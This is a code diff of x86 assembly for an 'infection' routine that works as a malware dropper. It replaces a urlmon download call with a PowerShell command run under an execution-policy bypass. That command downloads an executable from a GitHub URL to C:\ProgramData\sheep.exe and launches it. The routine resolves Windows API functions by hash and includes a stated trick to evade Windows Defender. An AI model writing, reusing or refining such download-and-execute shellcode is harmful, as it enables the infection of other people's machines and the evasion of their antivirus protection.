@@ -23,13 +23,13 @@ main:
    
    call infection__data         ; perform a call-pop to get offsets to our data
 infection__data__start:         ; this prevents relocations from forming because we are not
-infection__data__urlmon:        ; using absolute addresses for our data, making it more portable
-   db "urlmon.dll",0
+                                ; using absolute addresses for our data, making it more portable  
 infection__data__sheep:
    db "C:\\ProgramData\\sheep.exe",0
-infection__data__download_url:
-   db "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",0
-
+infection__data__powershell:
+   db "powershell -ExecutionPolicy bypass "
+   db "-Command ", 34, "(New-Object System.Net.WebClient).DownloadFile(" ; nasm strings, lol
+   db "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')", 34, 0
 infection__data:
    pop ebx                      ; get the pointer to the start of the data
    mov eax, 0xCF                ; bypass Windows Defender matching on fs:[0x30]
@@ -40,10 +40,10 @@ infection__data:
    mov ecx, [eax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
    mov eax, [ecx]               ; list_entry->InLoadOrderLinks.Flink (kernel32.dll)
    mov esi, [eax+0x18]          ; list_entry->DllBase
-   push 0x53b2070f
+   push 0x71948ca4
    push esi
-   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x53b2070f)
-   mov edi, eax                 ; get function for LoadLibraryA
+   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x71948ca4)
+   mov edi, eax                 ; get function for WaitForSingleObject
    push 0x4a7c0a09
    push esi
    call get_proc_by_hash        ; get_proc_by_hash(shell32_module, 0xb0ff5bf)
@@ -52,37 +52,57 @@ infection__data:
    push esi
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
    mov esi, eax                 ; get function for GetFileAttributesA
-   lea eax, [ebx+(infection__data__urlmon-infection__data__start)] ; urlmon.dll
-   push eax
-   call edi                                                        ; LoadLibraryA("urlmon.dll")
-   mov edi,[ebp-4]                                                 ; replace edi with CreateProcessA
-   push 0xd8d746fc
-   push eax
-   call get_proc_by_hash        ; get_proc_by_hash(urlmon_module, 0xd8d746fc)
-   mov [ebp-4], eax             ; get function for URLDownloadToFileA
+
+   xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures
+   movups [ebp-0x58],xmm0
+   movups [ebp-0x44],xmm0
+   movups [ebp-0x34],xmm0
+   movups [ebp-0x24],xmm0
+   movups [ebp-0x14],xmm0
+   mov dword [ebp-0x48],0x44
+
    lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
    push eax
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
 
-   push 0
-   push 0
-   lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; the sheep executable
+   lea eax, [ebp-0x58]
    push eax
-   lea eax, [ebx+(infection__data__download_url-infection__data__start)] ; big honkin github url
+   lea eax, [ebp-0x48]
    push eax
    push 0
-   call [ebp-4]                 ; URLDownloadToFileA(nullptr, "evil_sheep_url.exe", "C:\\ProgramData\\sheep.exe", 0, nullptr)
+   push 0
+   push 0
+   push 0
+   push 0
+   push 0
+   lea eax, [ebx+(infection__data__powershell-infection__data__start)]
+   push eax
+   push 0
+   call [ebp-4]                 ; CreateProcessA(NULL, "powershell command", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    test eax,eax
-   jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
+   jz infection__end            ; CreateProcessA failed
+
+   push 0xFFFFFFFF
+   push [ebp-0x58]
+   call edi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
+   test eax,eax
+   jnz infection__end           ; WaitForSingleObject returns 0 on success
+
+   xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures again
+   movups [ebp-0x58],xmm0
+   movups [ebp-0x44],xmm0
+   movups [ebp-0x34],xmm0
+   movups [ebp-0x24],xmm0
+   movups [ebp-0x14],xmm0
+   mov dword [ebp-0x48],0x44
 
 infection__payload_exists:
    lea eax, [ebp-0x58]
    push eax
    lea eax, [ebp-0x48]
    push eax
-   mov dword [ebp-0x48], 0x44
    push 0
    push 0
    push 0
@@ -92,13 +112,7 @@ infection__payload_exists:
    lea eax, [ebx+(infection__data__sheep-infection__data__start)]
    push eax
    push 0
-   xorps xmm0,xmm0
-   movups [ebp-0x58],xmm0
-   movups [ebp-0x44],xmm0
-   movups [ebp-0x34],xmm0
-   movups [ebp-0x24],xmm0
-   movups [ebp-0x14],xmm0
-   call edi                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
+   call [ebp-4]                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
    pop ebx
